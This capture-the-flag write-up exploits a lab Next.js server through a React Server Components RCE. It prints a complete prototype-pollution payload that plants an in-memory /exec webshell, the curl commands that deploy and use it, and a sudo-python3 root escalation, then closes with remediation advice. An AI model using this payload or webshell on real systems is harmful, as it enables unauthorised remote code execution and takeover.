# Romance & Co - CTF Writeup

## Challenge Overview
**Target:** `http://10.82.162.97:3000`  
**Objective:** Investigate a security breach at "Romance & Co" web application, find vulnerabilities, and capture user and root flags.

---

## Phase 1: Reconnaissance & Vulnerability Discovery

### Scanning for Next.js Vulnerability

First, I cloned the Next.js RCE scanner tool:
```bash
git clone https://github.com/Malayke/Next.js-RSC-RCE-Scanner-CVE-2025-66478
cd Next.js-RSC-RCE-Scanner-CVE-2025-66478
go build -o scanner
```

Running the scanner with proper Chrome flags (required for root execution):
```bash
./scanner -urls http://10.82.162.97:3000 -chrome-flags '--no-sandbox,--disable-setuid-sandbox'
```

**Result:**
```
URL                                           Status       Next.js Version    Vulnerability  
-----------------------------------------------------------------------------------------------
http://10.82.162.97:3000                      200          16.0.6             Vulnerable ⚠️
```

**Finding:** The application is running Next.js 16.0.6, which is vulnerable to **CVE-2025-66478** (React Server Components Remote Code Execution).

---

## Phase 2: Exploitation - Initial Access

### Installing Runtime Memory Shell

Created the webshell installation payload file:
```bash
cat > shell_install.txt << 'EOF'
------WebKitFormBoundaryx8jO2oVc6SWP3Sad
Content-Disposition: form-data; name="0"

{"then":"$1:__proto__:then","status":"resolved_model","reason":-1,"value":"{\"then\":\"$B1337\"}","_response":{"_prefix":"(async()=>{const http=await import('node:http');const url=await import('node:url');const cp=await import('node:child_process');const o=http.Server.prototype.emit;http.Server.prototype.emit=function(e,...a){if(e==='request'){const[r,s]=a;const p=url.parse(r.url,true);if(p.pathname==='/exec'){const cmd=p.query.cmd;if(!cmd){s.writeHead(400);s.end('cmd parameter required');return true;}try{s.writeHead(200,{'Content-Type':'application/json'});s.end(cp.execSync(cmd,{encoding:'utf8',stdio:'pipe'}));}catch(e){s.writeHead(500);s.end('Error: '+e.message);}return true;}}return o.apply(this,arguments);};})();","_chunks":"$Q2","_formData":{"get":"$1:constructor:constructor"}}}
------WebKitFormBoundaryx8jO2oVc6SWP3Sad
Content-Disposition: form-data; name="1"

"$@0"
------WebKitFormBoundaryx8jO2oVc6SWP3Sad
Content-Disposition: form-data; name="2"

[]
------WebKitFormBoundaryx8jO2oVc6SWP3Sad--
EOF
```

Deployed the webshell:
```bash
curl -X POST http://10.82.162.97:3000/ \
  -H "Next-Action: x" \
  -H "X-Nextjs-Request-Id: b5dce965" \
  -H "Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryx8jO2oVc6SWP3Sad" \
  -H "X-Nextjs-Html-Request-Id: SSTMXm7OJ_g0Ncx6jpQt9" \
  --data-binary @shell_install.txt
```

### Testing Remote Code Execution

```bash
curl "http://10.82.162.97:3000/exec?cmd=id"
```

**Output:**
```
uid=100(daniel) gid=101(secgroup) groups=101(secgroup),101(secgroup)
```

✅ **Successfully gained RCE as user `daniel`**

---

## Phase 3: Post-Exploitation & Evidence Gathering

### Discovering User Flag
```bash
curl "http://10.82.162.97:3000/exec?cmd=ls+-la+/home/daniel"
```

**Output:**
```
total 20
drwxr-sr-x    1 daniel   secgroup      4096 Jan 28 08:58 .
drwxr-xr-x    1 root     root          4096 Jan 28 08:27 ..
drwxr-sr-x    3 daniel   secgroup      4096 Jan 28 08:58 .npm
-rw-r--r--    1 daniel   secgroup        27 Jan 28 08:29 user.txt
```

Retrieved user flag:
```bash
curl "http://10.82.162.97:3000/exec?cmd=cat+/home/daniel/user.txt"
```

### Investigating the Application

```bash
curl "http://10.82.162.97:3000/exec?cmd=pwd"
# Output: /app

curl "http://10.82.162.97:3000/exec?cmd=ls+-la"
```

**Key Finding:** Found `exploit.py` in `/app` directory - evidence of the attacker's tooling.

```bash
curl "http://10.82.162.97:3000/exec?cmd=cat+exploit.py"
```

The exploit script revealed:
- **CVE-2025-55182** exploitation tool
- Author: hacx.me
- Python-based automated exploit for React Server Components RCE
- Confirms the attack vector used against Romance & Co

---

## Phase 4: Privilege Escalation

### Checking Sudo Privileges

```bash
curl "http://10.82.162.97:3000/exec?cmd=sudo+-l"
```

**Output:**
```
Matching Defaults entries for daniel on romance:
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

Runas and Command-specific defaults for daniel:
    Defaults!/usr/sbin/visudo env_keep+="SUDO_EDITOR EDITOR VISUAL"

User daniel may run the following commands on romance:
    (root) NOPASSWD: /usr/bin/python3
```

🎯 **Critical Finding:** User `daniel` can execute `python3` as root without a password!

### Escalating to Root

```bash
curl "http://10.82.162.97:3000/exec?cmd=sudo+python3+-c+'import+os;os.system(\"ls+-la+/root\")'"
```

**Output:**
```
total 16
drwx------    1 root     root          4096 Jan 28 08:29 .
drwxr-xr-x    1 root     root          4096 Jan 28 08:58 ..
drwxr-xr-x    1 root     root          4096 Jan 28 08:26 .npm
-rw-------    1 root     root            28 Jan 28 08:29 root.txt
```

Retrieved root flag:
```bash
curl "http://10.82.162.97:3000/exec?cmd=sudo+python3+-c+'import+os;os.system(\"cat+/root/root.txt\")'"
```

✅ **Root access achieved!**

---

## Summary of Attack Chain

### 1. **Initial Compromise**
- **Vulnerability:** CVE-2025-66478 (Next.js 16.0.6 React Server Components RCE)
- **Method:** Exploited prototype pollution in React Server Components
- **Tool Used:** Python exploit script found at `/app/exploit.py`

### 2. **Persistence**
- Deployed runtime memory shell via HTTP server hijacking
- Webshell accessible at `/exec?cmd=` endpoint

### 3. **Privilege Escalation**
- **Misconfiguration:** `sudo` allows `daniel` to run `python3` as root without password
- **Exploitation:** Used `sudo python3 -c 'import os;os.system(...)'` for command execution as root

### 4. **Impact**
- ✅ User flag captured: `/home/daniel/user.txt`
- ✅ Root flag captured: `/root/root.txt`
- Full system compromise achieved

---

## Recommendations

1. **Immediate Actions:**
   - Upgrade Next.js to version > 16.0.6 (patched version)
   - Remove sudo privileges for `python3` from user `daniel`
   - Rotate all credentials and secrets

2. **Long-term Security:**
   - Implement Web Application Firewall (WAF)
   - Enable security headers and input validation
   - Regular security audits and vulnerability scanning
   - Principle of least privilege for sudo access
   - Monitor for suspicious HTTP POST requests to root endpoints

---

## Tools Used
- Next.js RSC RCE Scanner: https://github.com/Malayke/Next.js-RSC-RCE-Scanner-CVE-2025-66478
- curl for command execution via webshell

**CTF Completed Successfully! 🎉**
